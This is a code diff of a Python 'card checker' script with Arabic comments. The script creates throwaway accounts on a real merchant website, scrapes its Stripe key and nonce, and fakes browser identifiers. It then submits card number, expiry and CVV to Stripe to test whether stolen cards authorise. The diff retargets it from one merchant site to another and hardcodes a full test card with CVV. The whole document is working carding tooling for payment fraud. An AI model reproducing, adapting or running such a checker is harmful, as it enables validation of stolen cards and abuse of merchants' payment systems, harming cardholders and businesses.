@@ -6,15 +6,9 @@ import uuid
 import time
 from user_agent import generate_user_agent
 
-def generate_random_email():
-    """توليد بريد إلكتروني عشوائي للتسجيل"""
-    name = ''.join(random.choices(string.ascii_lowercase, k=10))
-    number = ''.join(random.choices(string.digits, k=4))
-    return f"{name}{number}@gmail.com"
-
 def Stripe3(card_data):
     """
-    فحص بطاقة (Stripe Auth) على موقع 400pizzahallgreen.co
+    فحص بطاقة على timesleader.com (Stripe - Auth)
     card_data: رقم|شهر|سنة|cvv
     """
     try:
@@ -25,7 +19,6 @@ def Stripe3(card_data):
         yy = card_data.split("|")[2]
         cvc = card_data.split("|")[3].strip()
 
-        # تنسيق السنة
         if "20" in yy:
             yy = yy.split("20")[1]
         if len(yy) == 2:
@@ -33,20 +26,18 @@ def Stripe3(card_data):
         else:
             yy_full = yy
 
-        # إزالة أي مسافات من رقم البطاقة
         n = n.replace(" ", "")
 
-        # بدء جلسة
+        user = generate_user_agent()
         r = requests.Session()
-        user_agent = generate_user_agent()
-        site_url = "https://400pizzahallgreen.co"
+        site_url = "https://timesleader.com"
 
-        # ===== 1. فتح صفحة الحساب لاستخراج register nonce =====
+        # ===== 1. فتح صفحة الحساب =====
         print("\n[1/6] فتح صفحة الحساب...")
         headers = {
-            'authority': '400pizzahallgreen.co',
+            'authority': 'timesleader.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
-            'user-agent': user_agent,
+            'user-agent': user,
         }
         response = r.get(f'{site_url}/my-account/', headers=headers)
         print(f"    ✅ HTTP {response.status_code}")
@@ -60,16 +51,16 @@ def Stripe3(card_data):
 
         # ===== 2. تسجيل حساب جديد =====
         print("\n[2/6] تسجيل حساب جديد...")
-        email = generate_random_email()
+        email = f"user{random.randint(1000,9999)}{random.randint(1000,9999)}@gmail.com"
         password = f"Pass{random.randint(1000,9999)}"
 
         headers = {
-            'authority': '400pizzahallgreen.co',
+            'authority': 'timesleader.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
             'origin': site_url,
             'referer': f'{site_url}/my-account/',
-            'user-agent': user_agent,
+            'user-agent': user,
         }
 
         data = {
@@ -86,28 +77,32 @@ def Stripe3(card_data):
         # ===== 3. فتح صفحة إضافة البطاقة =====
         print("\n[3/6] فتح صفحة إضافة البطاقة...")
         headers = {
-            'authority': '400pizzahallgreen.co',
+            'authority': 'timesleader.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
-            'user-agent': user_agent,
+            'user-agent': user,
         }
         response = r.get(f'{site_url}/my-account/add-payment-method/', headers=headers)
         print(f"    ✅ HTTP {response.status_code}")
 
-        # استخراج Stripe Publishable Key
+        # استخراج Stripe Key
         pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', response.text)
+        if not pk_live:
+            pk_live = re.search(r'(pk_test_[A-Za-z0-9_-]+)', response.text)
         if not pk_live:
             return "❌ Stripe key not found"
         pk_live = pk_live.group(1)
         print(f"    🔑 Stripe key found")
 
-        # استخراج AJAX nonce (createAndConfirmSetupIntentNonce)
+        # استخراج AJAX nonce
         ajax_nonce = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)
+        if not ajax_nonce:
+            ajax_nonce = re.search(r'name="_ajax_nonce" value="(.*?)"', response.text)
         if not ajax_nonce:
             return "❌ AJAX nonce not found"
         ajax_nonce = ajax_nonce.group(1)
         print(f"    🔑 AJAX nonce: {ajax_nonce}")
 
-        # ===== 4. جلب معرفات Stripe (guid, muid, sid) =====
+        # ===== 4. جلب معرفات Stripe =====
         print("\n[4/6] جلب معرفات Stripe...")
         headers = {
             'authority': 'm.stripe.com',
@@ -115,7 +110,7 @@ def Stripe3(card_data):
             'content-type': 'text/plain;charset=UTF-8',
             'origin': 'https://m.stripe.network',
             'referer': 'https://m.stripe.network/',
-            'user-agent': user_agent,
+            'user-agent': user,
         }
         response = r.post('https://m.stripe.com/6', headers=headers, data='')
         try:
@@ -130,11 +125,11 @@ def Stripe3(card_data):
             sid = str(uuid.uuid4())
             print(f"    ⚠️ تم إنشاء معرفات وهمية")
 
-        # ===== 5. إرسال البطاقة إلى Stripe API =====
+        # ===== 5. إرسال البطاقة إلى Stripe =====
         print("\n[5/6] إرسال البطاقة إلى Stripe...")
         client_session_id = str(uuid.uuid4())
         elements_session_config_id = str(uuid.uuid4())
-        time_on_page = random.randint(10000, 99999)
+        times = random.randint(10000, 99999)
 
         headers = {
             'authority': 'api.stripe.com',
@@ -142,10 +137,10 @@ def Stripe3(card_data):
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://js.stripe.com',
             'referer': 'https://js.stripe.com/',
-            'user-agent': user_agent,
+            'user-agent': user,
         }
 
-        stripe_data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_full}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=GB&payment_user_agent=stripe.js%2Fea2f4b4e05%3B+stripe-js-v3%2Fea2f4b4e05%3B+payment-element%3B+deferred-intent&referrer={site_url}&time_on_page={time_on_page}&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key={pk_live}&_stripe_version=2025-09-30.clover'
+        stripe_data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_full}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fea2f4b4e05%3B+stripe-js-v3%2Fea2f4b4e05%3B+payment-element%3B+deferred-intent&referrer={site_url}&time_on_page={times}&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key={pk_live}&_stripe_version=2025-09-30.clover'
 
         response = r.post('https://api.stripe.com/v1/payment_methods', data=stripe_data, headers=headers)
 
@@ -158,12 +153,12 @@ def Stripe3(card_data):
         # ===== 6. تأكيد Setup Intent =====
         print("\n[6/6] تأكيد Setup Intent...")
         headers = {
-            'authority': '400pizzahallgreen.co',
+            'authority': 'timesleader.com',
             'accept': '*/*',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
             'origin': site_url,
             'referer': f'{site_url}/my-account/add-payment-method/',
-            'user-agent': user_agent,
+            'user-agent': user,
             'x-requested-with': 'XMLHttpRequest',
         }
 
@@ -197,9 +192,7 @@ def Stripe3(card_data):
 
 
 if __name__ == '__main__':
-    # اختبار السكريبت
     test_card = "5294158321468738|12|2026|904"
-    print(f"\n🚀 اختبار فحص بطاقة على 400pizzahallgreen.co")
     result = Stripe3(test_card)
     print(f"\n📇 Card: {test_card}")
     print(f"📊 Result: {result}")
